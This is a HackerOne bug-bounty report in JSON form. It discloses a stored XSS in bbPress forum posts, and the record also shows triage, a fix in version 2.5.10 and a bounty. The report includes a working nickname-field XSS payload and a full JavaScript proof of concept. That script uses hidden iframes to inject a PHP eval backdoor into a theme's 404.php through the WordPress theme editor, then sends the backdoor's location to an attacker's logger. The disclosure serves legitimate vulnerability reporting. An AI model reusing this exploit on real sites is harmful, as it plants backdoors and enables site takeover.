{"id":151117,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTExMTc=","url":"https://hackerone.com/reports/151117","title":"[bbPress] Stored XSS in any forum post.","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-07-13T12:38:02.036Z","submitted_at":"2016-07-13T12:38:02.036Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"psych0tr1a","url":"/psych0tr1a","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/005/593/c759a20a1f14c8a4350d8d664b051cb7eb1783cd_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":111,"url":"https://hackerone.com/automattic","handle":"automattic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Automattic","twitter_handle":"","website":"https://automattic.com","about":"WordPress.com, VaultPress, Akismet, Gravatar, WooCommerce, Polldaddy, Tumblr and more!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2015-5622"],"singular_disclosure_disabled":true,"disclosed_at":"2016-09-01T09:19:09.900Z","bug_reporter_agreed_on_going_public_at":"2016-08-02T09:18:41.724Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"#__Intro:__\nEncouraged by the success of cure53 and their reward, i start the research plugins in your scope. And almost immediately i found critical Stored XSS, which of course leeds to privelege escalation or PHP code execution. This vulnerability doesnt requres \"special\" preveleges like [CVE-2015-5622](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-5622 \"CVE-2015-5622\"). To demonstrate how this vulnerability elementary for expluatation i write a XSS to Shell exploit.\n\n\n#__Steps to reproduce the XSS:__\n1.  Send any message on topic or start new topic.\n2.  Edit this message.\n3.  Open http://localhost/wordpress/?bbp_user=%YOUR_USER_ID%\u0026edit=1\n4.  Edit your \"Nickname\" to:\n\n\t\tuser1\"onmouseover=\"alert(1);remove()\"style=\"position:absolute;left:0;top:0;margin-top:-100%;margin-left:-100%;width:5000px;height:5000px\"\n\n5.  Change your \"Display Name\" to new \"Nickname\", save and return to thread with your message.\n\n#__Screenshot:__\n{F10472} (In attachment)\n\n#__XSS to RCE PoC exploit:__\n\n\t\tvar yourServer = \"%Path to your logger%\"\n\n\t\tvar payload = \"\u003c?php eval($_GET['wp']); ?\u003e\"+\"\\n\";\n\t\tSitePath = document.head.innerHTML.match(/rel=\\\"pingback\\\" href=\\\"(.*?)\\/xmlrpc.php\\\"/m)[1]\n\t\tfunction eas(){ // edit and save\n\t\t\tov = window.frames.win404.document.getElementById('newcontent').value\n\t\t\twindow.frames.win404.document.getElementById('newcontent').value = payload + ov\n\t\t\tdocument.getElementsByName('win404')[0].setAttribute(\"onload\",\"\");\n\t\t\twindow.frames.win404.document.getElementsByName('submit')[0].click()\n\t\t\t((new Image).src=yourServer+\"?message=Check your backdoor here: \"+SitePath+\"/wp-content/themes/\"+themeName+\"/404.php?wp=phpinfo();\")\n\t\t}\n\n\t\tfunction pao(){ // parse and open\n\t\t\tewin = window.frames.editor.contentWindow || window.frames.contentDocument\n\t\t\turl404 = unescape(ewin.document.getElementById('templateside').getElementsByTagName('a')[0].href)\n\t\t        filepar = url404.match(/\\?file\\=(.*?)\\\u0026/m)[1]\n\t\t\tif(filepar.length\u003e10){\n\t\t\t\tthemeName = url404.match(/file\\=\\/themes\\/(.*?)\\//m)[1]\n\t\t\t}\n\t\t\telse{\n\t\t\t\tthemeName = url404.match(/theme\\=(.*?)$/m)[1]\n\t\t\t}\n\t\t\tvar win404 = document.createElement(\"iframe\");\n\t\t\twin404.style.opacity=0\n\t\t\twin404.name = 'win404';\n\t\t\twin404.src = url404\n\t\t\twin404.setAttribute(\"onload\",\"eas();this.onload=''\");\n\t\t\tdocument.body.appendChild(win404);\n\t\t}\n\t\t\n\t\tvar editor = document.createElement(\"iframe\");\n\t\teditor.style.opacity=0\n\t\teditor.name = 'editor';\n\t\teditor.src = SitePath+\"/wp-admin/theme-editor.php\";\n\t\teditor.setAttribute(\"onload\",\"pao();this.onload='';\");\n\t\tdocument.body.appendChild(editor);\n\nBest regards!","bounty_amount":"300.0","formatted_bounty":"$300","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":104721,"file_name":"bbpress.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/104/721/43032848e43243665754104fa3a90bc3aa0ff8cb/bbpress.PNG?response-content-disposition=attachment%3B%20filename%3D%22bbpress.PNG%22%3B%20filename%2A%3DUTF-8%27%27bbpress.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQTTPJWCNM%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T134439Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQDOwM9%2B2Ol25EbTHv2AOl1ZXwoFCdY81Kf4Cj%2BZw5bGagIhALNw4OtUKzuuJ5JDnXIMoizsmzLoA6B3TMlT4JOm5OV%2FKoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5IgxBja9Y5H4vqpYK%2BZIq1wMKEFztYF934tg2oiDnz06aS%2BIxaoyblb3k6%2F%2BxBMgQzBtDrU0ocKh0rsBsPTyultSX957Ztb0Xxm%2BlSHqRsjq6d7mkuWsgkJaqQC34P%2FPoowX%2BlH2ZrTK%2FmkJH0GzYvbYPapiuIgj7k6s%2BThAEuj5K1dIvpyoPZSWU4lDCKAHDR63JJK4rjQBzSsyouhVced%2BThWTOJVdRFvPpVLh85ANN2kni9b%2BvA%2BYr4QNdI7bXX3vCy%2Bmlxmt9OtrkNSzeMBq%2B4UjjQL%2BALBrQRVk2zZ5rDj%2ByazHJ4N56LN4FxJEAdf%2BKr7nn9dZ2DExdIbY7%2Blz79tlyq02tT%2B98LGY82aPEMuTJbBZN6Znugvuj3qTN5Ajkz33XEdb09pTvqYEHwNQvHa8molgvM8Hr0UftpVOr%2FcSDQ%2Be7ClWky3g9k3C7fx8DtVeV3YKXMiauv6oe6iv529tf7ZQLwVbk8MDZHKluj8DVRfRr7MlmTLozZouf9SJ7q02NxX1M1zjSiK9%2Bb3knUL5CRpQRCENhmDWhXpTY5NtCVb6swQ3By1ka7LxXtkUadmYfSCwXxpca0jIGluHz9THdy%2Fc3993usF1hP11r0y8u18g%2BZLF5OCf8pMK8LDv4nKUjODow6e2QiwY6pAHH%2FNyAbORzwpluWJFiLzeFhl5RjYZpJEx0nM7ZKbFuGASfNSFcAHpRW7ZXX%2BBSHdPdxqv%2BQd1FC1QHUbL0ZWNROontBy0xjQujOuLkMDUyDfIqsPUVcZohJWSYUkM5yYj9wg6BrbGLNW9NinBFdcPB5%2BIeF%2Bg7o5tKzk0UaPV%2FO3FiQPt3VlESRyrk8YbEQk7JEub211414ZV4sdV3jLFmf60bgw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=aa14d41d010f548051320cf62826f49db177c15adc7baf105e7f4d05e73eab56","file_size":7570,"type":"image/png"}],"allow_singular_disclosure_at":"2016-09-01T09:18:41.837Z","allow_singular_disclosure_after":-161238357.93116993,"singular_disclosure_allowed":true,"vote_count":12,"voters":["d1m0ck","artsploit","bogdantcaciuc","reactors08","yarbabin","mdv","techintheprovince","jineesh4k","ymy","rammarj","and 2 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1066847,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hi. I'm unable to reproduce this issue on the latest bbpress version. This sounds like you are testing with a privileged user:\n\nUsers with Administrator or Editor roles are allowed to publish unfiltered HTML in a default WordPress installation.\n\nIf you can reproduce this issue with a less privileged user or on the WordPress.com forums, then please let us know.","automated_response":false,"created_at":"2016-07-13T13:20:50.443Z","updated_at":"2016-07-13T13:20:50.443Z","actor":{"username":"xknown","cleared":false,"url":"/xknown","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1066918,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"@xknown Please read carefully before you add status \"need more info\" and decrease reputation.\n\nI say: \n\n\tThis vulnerability doesnt requres \"special\" preveleges like CVE-2015-5622.\n\nand I dont say anythin about HTML in message body\n\nXSS triggered after editing message with special nickname in div with content approximately like this \"Message edited by %username% at\"\n\n\nPlease be attentive.\nBest regards.","automated_response":false,"created_at":"2016-07-13T14:01:03.271Z","updated_at":"2016-07-13T14:01:03.271Z","actor":{"username":"psych0tr1a","cleared":false,"url":"/psych0tr1a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/593/c759a20a1f14c8a4350d8d664b051cb7eb1783cd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1066965,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Hi. Apologies, I was now able to reproduce the problem -- I was testing with an existing topic and I forgot the Edit message part. I'll forward your report to the bbPress/WordPress security team.","automated_response":false,"created_at":"2016-07-13T14:36:23.544Z","updated_at":"2016-07-13T14:36:23.544Z","actor":{"username":"xknown","cleared":false,"url":"/xknown","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1066968,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@xknown big thanx!","automated_response":false,"created_at":"2016-07-13T14:37:14.400Z","updated_at":"2016-07-13T14:37:14.400Z","actor":{"username":"psych0tr1a","cleared":false,"url":"/psych0tr1a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/593/c759a20a1f14c8a4350d8d664b051cb7eb1783cd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1066977,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@xknown now i test https://wordpress.org/support/ and has been blocked :(\nBUT! i can bypass blocking. Is it bug?","automated_response":false,"created_at":"2016-07-13T14:39:35.860Z","updated_at":"2016-07-13T14:39:35.860Z","actor":{"username":"psych0tr1a","cleared":false,"url":"/psych0tr1a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/593/c759a20a1f14c8a4350d8d664b051cb7eb1783cd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1081148,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @xknown bug has been fixed in 2.5.10 release. Do u can close this report?","automated_response":false,"created_at":"2016-07-21T21:42:53.755Z","updated_at":"2016-07-21T21:42:53.755Z","actor":{"username":"psych0tr1a","cleared":false,"url":"/psych0tr1a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/593/c759a20a1f14c8a4350d8d664b051cb7eb1783cd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1101779,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2016-08-02T09:17:23.204Z","updated_at":"2016-08-02T09:17:23.204Z","actor":{"username":"xknown","cleared":false,"url":"/xknown","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"psych0tr1a","url":"/psych0tr1a"},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1101780,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2016-08-02T09:17:54.095Z","updated_at":"2016-08-02T09:17:54.095Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Automattic"}},"bounty_amount":"300.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"automattic","collaborator":{"username":"psych0tr1a","url":"/psych0tr1a"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1101782,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"limited disclose pls.\n300$ because is not wordpress core?","automated_response":false,"created_at":"2016-08-02T09:18:41.758Z","updated_at":"2016-08-02T09:18:41.758Z","first_to_agree":true,"actor":{"username":"psych0tr1a","cleared":false,"url":"/psych0tr1a","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/005/593/c759a20a1f14c8a4350d8d664b051cb7eb1783cd_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1167126,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2016-09-01T09:19:09.984Z","updated_at":"2016-09-01T09:19:09.984Z","actor":{"url":"/automattic","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/111/7f89e1ea233f92916202521a069fdbfe9eced339_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Automattic"}},"genius_execution_id":null,"team_handle":"automattic","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}